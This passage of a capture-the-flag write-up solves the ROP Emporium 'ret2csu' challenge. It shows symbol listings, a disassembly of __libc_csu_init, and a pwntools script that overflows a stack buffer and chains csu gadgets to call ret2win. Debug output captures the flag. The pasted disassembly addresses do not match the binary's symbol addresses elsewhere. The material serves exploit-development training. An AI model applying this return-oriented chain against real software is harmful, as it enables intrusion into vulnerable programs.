[*] Process '/root/Downloads/RopEmporium/pivot' stopped with exit code 0 (pid 12091)
[*] Got EOF while reading in interactive
$  
```
## Ret2csu

### NM
```
[root:~/Downloads/RopEmporium]# nm ./ret2csu | grep " t \| T "
0000000000400630 t deregister_tm_clones
0000000000400620 T _dl_relocate_static_pie
00000000004006a0 t __do_global_dtors_aux
00000000004008b4 T _fini
00000000004006d0 t frame_dummy
0000000000400560 T _init
00000000004008b0 T __libc_csu_fini
0000000000400840 T __libc_csu_init
00000000004006d7 T main
0000000000400714 t pwnme
0000000000400660 t register_tm_clones
00000000004007b1 T ret2win
00000000004005f0 T _start
```

### Rabin2
```
[root:~/Downloads/RopEmporium]# rabin2 -i ret2csu
[Imports]
Num  Vaddr       Bind      Type Name
   1 0x00400590  GLOBAL    FUNC puts
   2 0x004005a0  GLOBAL    FUNC system
   3 0x004005b0  GLOBAL    FUNC printf
   4 0x004005c0  GLOBAL    FUNC memset
   5 0x00000000  GLOBAL    FUNC __libc_start_main
   6 0x004005d0  GLOBAL    FUNC fgets
   7 0x00000000    WEAK  NOTYPE __gmon_start__
   8 0x004005e0  GLOBAL    FUNC setvbuf
   5 0x00000000  GLOBAL    FUNC __libc_start_main
   7 0x00000000    WEAK  NOTYPE __gmon_start__
```

### Use gadgets from __libc_csu_init
```
0000000000400b10 <__libc_csu_init>:                                                                                                                                                              
  400b10:       41 57                   push   r15                                                                                                                                               
  400b12:       41 56                   push   r14                                                                                                                                               
  400b14:       41 89 ff                mov    r15d,edi                                                                                                                                          
  400b17:       41 55                   push   r13                                                                                                                                               
  400b19:       41 54                   push   r12                                                                                                                                               
  400b1b:       4c 8d 25 ce 12 20 00    lea    r12,[rip+0x2012ce]        # 601df0 <__frame_dummy_init_array_entry>                                                                               
  400b22:       55                      push   rbp                                                                                                                                               
  400b23:       48 8d 2d ce 12 20 00    lea    rbp,[rip+0x2012ce]        # 601df8 <__init_array_end>                                                                                             
  400b2a:       53                      push   rbx                                                                                                                                               
  400b2b:       49 89 f6                mov    r14,rsi
  400b2e:       49 89 d5                mov    r13,rdx
  400b31:       4c 29 e5                sub    rbp,r12
  400b34:       48 83 ec 08             sub    rsp,0x8
  400b38:       48 c1 fd 03             sar    rbp,0x3
  400b3c:       e8 77 fc ff ff          call   4007b8 <_init>
  400b41:       48 85 ed                test   rbp,rbp
  400b44:       74 20                   je     400b66 <__libc_csu_init+0x56>
  400b46:       31 db                   xor    ebx,ebx
  400b48:       0f 1f 84 00 00 00 00    nop    DWORD PTR [rax+rax*1+0x0]
  400b4f:       00 
  400b50:       4c 89 ea                mov    rdx,r13
  400b53:       4c 89 f6                mov    rsi,r14
  400b56:       44 89 ff                mov    edi,r15d
  400b59:       41 ff 14 dc             call   QWORD PTR [r12+rbx*8]
  400b5d:       48 83 c3 01             add    rbx,0x1
  400b61:       48 39 eb                cmp    rbx,rbp
  400b64:       75 ea                   jne    400b50 <__libc_csu_init+0x40>
  400b66:       48 83 c4 08             add    rsp,0x8
  400b6a:       5b                      pop    rbx
  400b6b:       5d                      pop    rbp
  400b6c:       41 5c                   pop    r12
  400b6e:       41 5d                   pop    r13
  400b70:       41 5e                   pop    r14
  400b72:       41 5f                   pop    r15
  400b74:       c3                      ret    
  400b75:       90                      nop
  400b76:       66 2e 0f 1f 84 00 00    nop    WORD PTR cs:[rax+rax*1+0x0]
  400b7d:       00 00 00 
```
### Function: _fini
```
0000000000400b84 <_fini>:
  400b84:       48 83 ec 08             sub    rsp,0x8
  400b88:       48 83 c4 08             add    rsp,0x8
  400b8c:       c3                      ret 
```
### Getting a pointer to _fini using it's address in PLT
```
pwndbg> x/10xg  &_DYNAMIC
0x600e20:       0x0000000000000001      0x0000000000000001
0x600e30:       0x000000000000000c      0x0000000000400560
0x600e40:       0x000000000000000d      0x00000000004008b4
0x600e50:       0x0000000000000019      0x0000000000600e10
0x600e60:       0x000000000000001b      0x0000000000000008
```
<b>0x600e40:       0x000000000000000d      0x00000000004008b4</b>
```
pwndbg> x/x 0x600e48
0x600e48:       0x00000000004008b4
```
### Exploit
```
#!/usr/bin/env python
# Import the library
from pwn import *

# Debugging
context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-v']

# Binary has NX set - no typical BOF - 
# Help info: http://docs.pwntools.com/en/stable/intro.html
# Useful doc: https://www.voidsecurity.in/2013/07/some-gadget-sequence-for-x8664-rop.html

elf = ELF("ret2csu")

# Objective:
# The third argument (rdx) must be 0xdeadcafebabebeef
# 
# Move '0xdeadcafebabebeef' to memory
# Get the memory address into rdx
# Jump to ret2win

# Addresses
#
callGadget = p64(0x600e48)

# Gadgets
#
# 0x40089a <__libc_csu_init+90>:       pop    rbx,pop    rbp,pop    r12,pop    r13,pop    r14,pop    r15,ret   
csupopGadget = p64(0x40089a)
#    0x400880 <__libc_csu_init+64>:       mov    rdx,r15, mov    rsi,r14, mov    edi,r13d, call   QWORD PTR [r12+rbx*8]
csumovGadget = p64(0x400880)
# Address of ret2win: 0x00000000004007b1
ret2win = p64(0x00000000004007b1)

payload = "a" * 40
payload += csupopGadget     # Gadget 1: Pop registers with the data required
payload += p64(0x00)        # Reg: rbx
payload += p64(0x01)        # Reg: rbp
payload += callGadget       # Reg: r12 - PTR to Address of the _fini function
payload += p64(0x00)        # Reg: r13
payload += p64(0x00)        # Reg: r14
payload += p64(0xdeadcafebabebeef)  # Reg: r15 - Our target payload
payload += csumovGadget     # Gadget 2: Mov instruction
payload += p64(0x00)        # Satisfy add rsp
payload += p64(0x00)        # Satisfy pop rbx
payload += p64(0x00)        # Satisfy pop rbp
payload += p64(0x00)        # Satisfy pop r12
payload += p64(0x00)        # Satisfy pop r13
payload += p64(0x00)        # Satisfy pop r14
payload += p64(0x00)        # Satisfy pop r15
payload += ret2win          # Call ret2win :-)

# GTG!
io = elf.process()
gdb.attach(io,"""
fin
fin
fin
fin
fin
b *pwnme+156
c
""")
io.sendline(payload)
io.interactive()
```

### Result
```
DEBUG] Sent 0xa9 bytes:
    00000000  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│
    *
    00000020  61 61 61 61  61 61 61 61  9a 08 40 00  00 00 00 00  │aaaa│aaaa│··@·│····│
    00000030  00 00 00 00  00 00 00 00  01 00 00 00  00 00 00 00  │····│····│····│····│
    00000040  48 0e 60 00  00 00 00 00  00 00 00 00  00 00 00 00  │H·`·│····│····│····│
    00000050  00 00 00 00  00 00 00 00  ef be be ba  fe ca ad de  │····│····│····│····│
    00000060  80 08 40 00  00 00 00 00  00 00 00 00  00 00 00 00  │··@·│····│····│····│
    00000070  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
    *
    000000a0  b1 07 40 00  00 00 00 00  0a                        │··@·│····│·│
    000000a9
[*] Switching to interactive mode
[DEBUG] Received 0x5f bytes:
    'ret2csu by ROP Emporium\n'
    '\n'
    'Call ret2win()\n'
    'The third argument (rdx) must be 0xdeadcafebabebeef\n'
    '\n'
    '> '
ret2csu by ROP Emporium

Call ret2win()
The third argument (rdx) must be 0xdeadcafebabebeef

> [DEBUG] Received 0x21 bytes:
    'ROPE{a_placeholder_32byte_flag!}\n'
ROPE{a_placeholder_32byte_flag!}
[*] Got EOF while reading in interactive
```
